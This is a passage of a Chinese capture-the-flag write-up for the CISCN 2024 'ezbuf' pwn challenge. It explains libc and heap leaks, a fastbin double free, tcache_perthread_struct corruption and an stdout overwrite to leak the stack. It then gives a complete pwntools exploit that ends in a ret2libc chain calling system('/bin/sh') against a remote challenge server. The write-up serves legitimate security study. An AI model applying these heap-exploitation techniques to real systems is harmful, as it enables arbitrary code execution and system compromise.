![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-heap-cmp-2.png)
查看不同堆块的数据
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-heap-cmp-hexdump.png)
最终运行结果
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-leak.png)

第一处不同是解包过程中申请的内存块，这里可以得知解包中会申请与content大小相同的堆块存放内容
第二次不同是menu函数申请的0x30大小的堆块，用来存放content，不过把smallbin的bk指针一起copy了
可以得知输入8字节数据后可以泄露出一个smallbin的bk指针，调试获取偏移即可计算libc基址
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-leak-2.png)

得到偏移 2206944(0x21ace0)

### 思路
1. 通过遗留的small bin的bk指针调试获取偏移，计算libc基址
2. 将堆块释放进入tcache，利用PROTECT_PTR机制获取堆上地址(缺少最后12bit)，调试获取与heap基址的偏移，计算heap基址
3. 申请0x40的堆块，填满tcache
4. 利用double free构造fastbin循环链表
5. 将所有0x40大小的tcache全部申请出来
6. 调试获取循环链表中第一个链表的地址与heap_base的差值(为了生成PROTECT_PTR保护后的地址)
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-leak-3.png)
7. 利用PROTECT_PTR公式，填充相应的地址`p64((heap_base + 0xf0)^((heap_base + 0x004e40)>>12))`
![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-alloc.png)
8. 在heap_base + 0xf0处(即0xf0大小的tcache块的entries指针处)，填上heap_base+0x10地址，之后申请0xe0大小的堆块后就会在heap_base+0x10处取堆块，由于tcache指向的是用户内存，所以它实际上申请到了tcache_perthread_struct，关于这个结构体的攻击，可以查看[tcache-perthread-corruption](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-perthread-corruption)
9. 之后便可以更改tcache_perthread_struct了，可以实现tcache的任意分配，分配到stdout更改write_ptr和write_end指针泄露environ，调试environ与栈的偏移计算出栈地址，然后在利用tcache_perthread_struct分配到栈上进行ret2libc

关于tcache_perthread_struct的构造、_IO_2_1_stdout_的构造，最后栈偏移的计算还不熟悉，之后再练练
整个周末都在看这题，总算是解决一部分了

### exp
```python
from pwn import *
import heybro_pb2

#p = process("./pwn")
p = remote("pwn.challenge.ctf.show",28127)
elf = ELF("./pwn")
remote_libc = ELF("./libc.so.6")
local_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = remote_libc

context.log_level = 'debug'
#context.terminal = ['tmux','splitw','-h']

def create(idx,content):
    data = heybro_pb2.heybro()
    data.whattodo = 1
    data.whatcon = content
    data.whatidx = idx
    data.whatsize = 0
    data.whatsthis = 0
    data = data.SerializeToString()
    p.recvuntil(b'WANT?\n')
    p.send(data)
 
def delete(idx):
    data = heybro_pb2.heybro()
    data.whattodo = 2
    data.whatcon = b'0'
    data.whatidx = idx
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b'WANT?\n')
    p.send(data)
 
def show(idx):
    data = heybro_pb2.heybro()
    data.whattodo = 3
    data.whatcon = b'0'
    data.whatidx = idx
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b'WANT?\n')
    p.send(data)
 
def do_nothing(content):
    data = heybro_pb2.heybro()
    data.whattodo = 0
    data.whatcon = content
    data.whatidx = 1
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b'WANT?\n')
    p.send(data)    

for i in range(9):
    create(i,b'aaaaaaaa')

# leak libc_base
show(0)
p.recvuntil(b'aaaaaaaa')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 0x21ace0
log.success('libc_base : ' + hex(libc_base))

# leak heap_base
delete(0)
show(0)
p.recvuntil(b'Content:')
leak = u64(p.recv(5).ljust(8,b'\x00'))
heap_base = (leak << 12) - 0x2000 
log.success('heap_addr : ' + hex(heap_base))

# fill 0x40 tcache
for i in range(6):
    delete(i+1)

# double free fastbin
delete(7)
delete(8)
delete(7)

# malloc all tcache
for i in range(7):
    create(i,b'a'*8)

environ = libc_base + libc.sym['environ']
stdout = libc_base + libc.sym['_IO_2_1_stdout_']

create(7,p64((heap_base+0xf0)^((heap_base+0x004e40)>>12)))
create(8,b'aaaaaa')
create(8,b'a')

# fill heap_base+0xf0 entries ptr
create(8,p64(0) + p64(heap_base+0x10))

do_nothing((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)).ljust(0xe0,b"\x00"))

# leak stack_addr
do_nothing(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8)) 
leak = u64(p.recv(6).ljust(8,b'\x00'))
stack_addr = leak - 0x1a8 + 0x40
log.success("stack_addr : " + hex(stack_addr))

do_nothing((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(0)+p64(0)+p64(stack_addr)).ljust(0xa0,b"\x00"))

#gdb.attach(p)

pop_rdi = 0x2a3e5 + libc_base
system = libc.sym['system'] + libc_base
binsh = next(libc.search(b"/bin/sh\x00")) + libc_base
ret = 0x2a3e6 + libc_base
payload = cyclic(8) + p64(ret) +  p64(pop_rdi) + p64(binsh) + p64(system)
payload = payload.ljust(0x58,b'\x00')

do_nothing(payload)

p.interactive()
```

## EzHeap

## SuperHeap

## magic_vm

